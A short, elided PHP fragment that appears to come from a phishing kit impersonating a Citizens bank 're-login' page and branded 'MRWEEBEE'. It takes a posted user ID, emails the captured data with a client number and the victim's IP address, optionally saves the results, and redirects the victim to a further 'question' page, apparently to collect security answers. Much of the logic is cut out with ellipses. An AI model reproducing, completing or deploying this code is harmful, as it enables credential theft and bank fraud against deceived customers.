...
if(empty($_POST['UserID1']) || !isset($_POST['UserID1'])){
...
if ($settings['send_mail'] == "1"){
       ...
       $subject = "🔰MRWEEBEE🔰CITIZEN🔰RELOGIN🔰CLIENT #{$client}🔰{$IP}";
       $msg = $message;
...
if ($settings['save_results'] == "1"){
  ...
  echo "<script>window.location.href = \"../question\"; </script>";
